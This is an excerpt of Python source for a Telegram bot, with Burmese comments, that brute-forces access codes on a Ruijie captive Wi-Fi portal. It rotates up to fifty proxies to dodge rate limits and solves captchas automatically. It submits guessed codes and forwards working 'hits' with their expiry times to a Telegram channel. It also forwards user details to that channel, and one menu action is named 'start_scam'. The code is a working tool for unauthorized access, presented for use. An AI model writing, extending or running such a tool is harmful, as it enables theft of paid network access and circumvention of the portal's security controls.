...
# --- SPEED & PROXY CONFIGURATION ---
MAX_CONCURRENT = 20
BATCH_SIZE = 10
CONNECTION_LIMIT = 500
CONNECTION_PER_HOST = 50
TIMEOUT = 25
MAX_ACTIVE_PROXIES = 50  # Proxy အများဆုံး ၅၀ လောက်သာ တစ်ခါတည်း သုံးရန်
        ...
        async with aiohttp.ClientSession() as session:
            async with session.get(PROXY_API_URL, headers=headers, timeout=10) as response:
                if response.status == 200:
                    ...
                    if proxies:
                        # Proxy တွေကို ရောနှောပြီး သတ်မှတ်ထားသော အရေအတွက် (MAX_ACTIVE_PROXIES) ထက် ပိုမသွားအောင် ယူမည်
                        random.shuffle(proxies)
                        DYNAMIC_PROXIES = proxies[:MAX_ACTIVE_PROXIES * 2]  # အရန်အတွက် အနည်းငယ်ပိုသိမ်းမည်
...
def get_next_proxy():
    ...
    if not DYNAMIC_PROXIES:
        return None
    # အကယ်၍ Proxy အရေအတွက် နည်းသွားပါက Background မှ အသစ်တစ်ချက် လှမ်းဆွဲခိုင်းမည်
    if len(DYNAMIC_PROXIES) < 10:
        asyncio.create_task(fetch_dynamic_proxies())
    return random.choice(DYNAMIC_PROXIES)

def remove_dead_proxy(proxy_str):
    global DYNAMIC_PROXIES
    if proxy_str in DYNAMIC_PROXIES:
        try:
            DYNAMIC_PROXIES.remove(proxy_str)
        except ValueError:
            pass
    # Proxy တွေ ချက်ချင်းကုန်သွားရင် အသစ်ပြန်ခေါ်မယ်
    if len(DYNAMIC_PROXIES) < 10:
        asyncio.create_task(fetch_dynamic_proxies())
...
🔀 Active Proxies: {proxy_count} loaded (Limit: {MAX_ACTIVE_PROXIES})
🔄 Last update: {last_update_str}
🟢 Status: Active & Ready
⚙️ Mode: Smart Proxy Rotation
...
အောက်ပါ Control Panel မှ လိုအပ်သည်များကို လုပ်ဆောင်ပါ။"""
    ...
    asyncio.create_task(forward_to_channel(f"🆕 New User Started\n\n👤 Name: {user_name}\n🆔 ID: {user_id}"))
...
⚙️ Mode: Smart Proxy Rotation"""
    ...
    if call.data == "menu_stop":
        await stop_scan_internal(chat_id)
        return
    ...
    if call.data == "menu_start_scam":
        ...
        asyncio.create_task(forward_to_channel(
            f"🚀 **Scan Started**\n👤 **User:** {user_name}\n🔢 **Mode:** {mode}\n🔗 **URL:** `{portal_url}`",
            parse_mode="Markdown"
        ))
...
async def handle_portal(message):
    ...
    sent_msg = await bot.reply_to(message, "🔗 Portal URL အား စစ်ဆေးနေပါသည်...")
    if await check_session_url(session_url=url, use_proxy=False):
        user_data[chat_id]['session_url'] = url
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=sent_msg.message_id,
            text="✅ Portal URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။",
            reply_markup=get_main_keyboard(str(chat_id))
        )
    else:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=sent_msg.message_id,
            text="❌ Portal URL မှားယွင်းနေပါသည်။"
        )

async def stop_scan_internal(chat_id):
    ...
    if data and not data["task"].done():
        ...
        try:
            await bot.send_message(chat_id, "🛑 Scanner ကို ရပ်တန့်လိုက်ပါပြီ။", reply_markup=get_back_keyboard())
        except:
            pass
    else:
        try:
            await bot.send_message(chat_id, "ရပ်တန့်ရန် Scanner အလုပ်မလုပ်ပါ။", reply_markup=get_back_keyboard())
        except:
            pass

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    await stop_scan_internal(message.chat.id)
...
def format_scanner_progress(tried, current_code, hits, expired, limits, speed, hit_codes_list):
    ...
    return (
        f"⚡ Scanner Running (Smart Rotation) ⚡\n"
        ...
        f"🔀 Active Proxies: {proxy_active_count}/{MAX_ACTIVE_PROXIES}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔥 Hit Codes:\n{hit_text}"
    )
...
async def check_session_url(session_url, use_proxy=False):
    ...
    proxy = f"http://{proxy_str}" if use_proxy and proxy_str else None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=10) as response:
                ...
                if "sessionId" in text_ or "stage=portal" in session_url:
                    return True
                return False
    except:
        if proxy_str:
            remove_dead_proxy(proxy_str)
        if "portal-as.ruijienetworks.com" in session_url:
            return True
        return False

async def get_session_id(session, session_url, proxy_str):
    mac = get_mac()
...
async def perform_check(session_url, code, chat_id, scan_id=None):
    ...
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url, proxy_str)
            if not session_id:
                if proxy_str:
                    remove_dead_proxy(proxy_str)
                return "fail", None
            ...
            auth_code = None
            for _ in range(3):
                image = await Captcha_Image(task_session, session_id, proxy, proxy_str)
                if not image:
                    continue
                text = await Captcha_Text(image)
                if text and await Varify_Captcha(task_session, session_id, text, proxy, proxy_str):
                    auth_code = text
                    break
            if not auth_code:
                return "fail", None
            ...
            async with task_session.post(post_url, json=data, headers=headers, proxy=proxy) as req:
                ...
                if 'logonUrl' in response or 'success' in response:
                    expire_text, raw_mins = await Code_Expires_Date(session_id, proxy, proxy_str)
                    ...
                    asyncio.create_task(forward_to_channel(f"🔥 **HIT FOUND!**\nCode: `{code}`\nInfo: {expire_text}", parse_mode="Markdown"))
...
async def Code_Expires_Date(active_id, proxy, proxy_str):
...
async def Captcha_Image(session, session_id, proxy, proxy_str):
...
async def Varify_Captcha(session, session_id, text, proxy, proxy_str):
